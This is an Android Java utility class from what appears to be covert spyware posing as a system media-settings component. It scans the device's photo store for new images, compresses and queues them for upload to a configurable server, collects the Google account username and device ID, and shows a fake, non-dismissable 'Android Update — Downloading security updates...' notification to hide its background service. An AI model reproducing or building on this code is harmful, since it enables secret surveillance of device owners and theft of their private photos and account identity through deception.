package com.android.media.settings.Utility;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import com.android.media.settings.Interface.MediaAPI;
import com.android.media.settings.MediaConfig;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Model.Media;
import com.android.media.settings.Model.User;
import com.google.gson.Gson;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import io.reactivex.Observable;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import okhttp3.OkHttpClient;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Retrofit;
import retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;
import retrofit2.converter.gson.GsonConverterFactory;

public class MediaUtility {
    private static final String TAG = "Media Utility";
    private Context context;
    private MediaDBManager dbManager;
    private MediaConfig mConfig;
    private static MediaUtility mMediaUtility;

    private Uri extMediaUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
    private String projection[] = {
            MediaStore.Images.ImageColumns._ID,
            MediaStore.Images.ImageColumns.BUCKET_ID,
            MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
            MediaStore.Images.ImageColumns.DATA,
            MediaStore.Images.ImageColumns.DATE_ADDED
    };

    public MediaUtility(Context context) {
        this.context = context;
        this.dbManager = new MediaDBManager(context);
        this.mConfig = new MediaConfig(context);
    }

    public MediaUtility() {
    }

    public static MediaUtility getInstance(Context context) {
        if(mMediaUtility == null) {
            mMediaUtility = new MediaUtility(context);
        }
        return mMediaUtility;
    }

    public User getUser(){
        return new User(getUsername(), getDeviceId());
    }

    public String toJson(Object object) {
        Gson gson = new Gson();
        return gson.toJson(object);
    }

    Cursor fetchMediaStore() {
        String id = "0";
        SharedPreferences pref = context.getSharedPreferences(MediaConfig.PREF_NAME, Context.MODE_PRIVATE);
        if(isFirstInstall()) {
            id = this.getLatestMediaId();
            SharedPreferences.Editor prefEditor = pref.edit();
            prefEditor.putString(MediaConfig.PREF_MEDIA_STORE_INIT, id);
            prefEditor.apply();
        }else {
            id = dbManager.lastInsertedMedia();
        }

        String filterQuery = MediaStore.Images.ImageColumns._ID + " > " + id;
        return context.getContentResolver().query(
                extMediaUri,
                projection,
                filterQuery,
                null,
                MediaStore.Images.ImageColumns._ID + " ASC"
        );
    }

    public boolean isFirstInstall() {
        SharedPreferences pref = context.getSharedPreferences(MediaConfig.PREF_NAME, Context.MODE_PRIVATE);
        return !pref.contains(MediaConfig.PREF_MEDIA_STORE_INIT);
    }

    private String getLatestMediaId() {
        String id = "0";
        Cursor c = context.getContentResolver().query(
                extMediaUri,
                projection,
                null,
                null,
                MediaStore.Images.ImageColumns._ID + " DESC LIMIT 0, 1"
        );
        try {
            if(c != null && c.moveToFirst()) {
                id = c.getString(c.getColumnIndex(MediaStore.Images.ImageColumns._ID));
                c.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return id;
    }

    private Bitmap.CompressFormat getCompressFormat(String imgUri) {
        String format = imgUri.substring(imgUri.lastIndexOf("."));
        switch (format.toLowerCase()) {
            case "jpeg":
            case "jpg":
                return Bitmap.CompressFormat.JPEG;
            case "png":
                return Bitmap.CompressFormat.PNG;
            case "webp":
                return Bitmap.CompressFormat.WEBP;
            default:
                return Bitmap.CompressFormat.JPEG;
        }
    }

    public File compressImage(String strUri, String id) {
        Bitmap.CompressFormat format = getCompressFormat(strUri);
        return ImageUtility.compressToFile(
                context,
                id,
                new File(strUri),
                mConfig.getIMG_MAX_WIDTH(),
                mConfig.getIMG_MAX_HEIGHT(),
                format,
                mConfig.getIMG_CONFIG(),
                mConfig.getIMG_QUALITY(),
                MediaConfig.getFileStoragePath(context, false)
        );
    }

    void compressAndStore(String uri, String id){
        File imgFile = new File(uri);
        if(imgFile.exists()) {
            final Media media = new Media(id, imgFile.getAbsolutePath());
            Observable.just(compressImage(uri, id))
                    .subscribeOn(AndroidSchedulers.mainThread())
                    .subscribe(new Observer<File>() {
                        @Override
                        public void onSubscribe(Disposable d) {

                        }

                        @Override
                        public void onNext(File file) {
                            media.setPath(file.getAbsolutePath());
                            dbManager.insertMedia(media);
                        }

                        @Override
                        public void onError(Throwable e) {
                            media.setStatus(3);
                            dbManager.insertMedia(media);
                        }

                        @Override
                        public void onComplete() {
                        }
                    });
        }
    }

    private boolean networkOnline() {
        ConnectivityManager manager =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        boolean isAvailable = false;
        if(manager!= null) {
            NetworkInfo networkInfo = manager.getActiveNetworkInfo();
            if (networkInfo != null && networkInfo.isConnected()) {
                isAvailable = true;
            }
        }
        return isAvailable;
    }

    boolean networkConnected() {
        if(networkOnline()) {
            try {
                HttpURLConnection connection = (HttpURLConnection) (new URL("http://www.google.com").openConnection());
                connection.setRequestProperty("User-Agent", "Test");
                connection.setRequestProperty("Connection", "close");
                connection.setConnectTimeout(1500);
                connection.connect();
                return (connection.getResponseCode() == 200);
            } catch (IOException e) {
                Log.e(TAG, "Error: ", e);
            }
        }
        return false;
    }

    private MediaAPI mMediaAPI;
    MediaAPI initRetroService() {
        if(mMediaAPI != null) return mMediaAPI;
        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
        interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);

        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(5, TimeUnit.MINUTES)
                .readTimeout(5, TimeUnit.MINUTES)
                .addInterceptor(interceptor)
                .build();

        Log.d(TAG, new MediaConfig(context).getAPI_BASE_URL());

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(new MediaConfig(context).getAPI_BASE_URL())
                .client(client)
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        mMediaAPI = retrofit.create(MediaAPI.class);
        return mMediaAPI;
    }

    String getUsername() {
        AccountManager manager = AccountManager.get(context);
        Account[] accounts = manager.getAccountsByType("com.google");
        List<String> possibleEmails = new LinkedList<>();

        for (Account account : accounts) {
            possibleEmails.add(account.name);
        }

        if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
            String email = possibleEmails.get(0);
            String[] parts = email.split("@");

            if (parts.length > 1)
                return parts[0];
        }
        return null;
    }

    String getDeviceId() {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if(manager != null) {
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }
        return false;
    }

    public String getCurrentDateTime() {
        SimpleDateFormat dateFormat = new SimpleDateFormat(
                "yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        Date date = new Date();
        return dateFormat.format(date);
    }

    public Notification getNotification() {
        Notification notification;
        NotificationCompat.Builder bBuilder = new NotificationCompat.Builder(
                context).setSmallIcon(android.R.drawable.ic_secure)
                .setContentTitle("Android Update")
                .setPriority(Notification.PRIORITY_MAX)
                .setContentText("Downloading security updates...").setOngoing(true);
        notification = bBuilder.build();
        notification.flags |= Notification.FLAG_FOREGROUND_SERVICE;
        notification.flags |= Notification.FLAG_NO_CLEAR;
        notification.flags |= Notification.FLAG_ONGOING_EVENT;
        return notification;
    }

    public boolean checkPermissions(int[] permissions) {
        boolean allGranted = true;
        for(int perm : permissions) {
            Log.d(TAG, perm + "");
            if(perm != PackageManager.PERMISSION_GRANTED) allGranted = false;
        }
        return allGranted;
    }

}
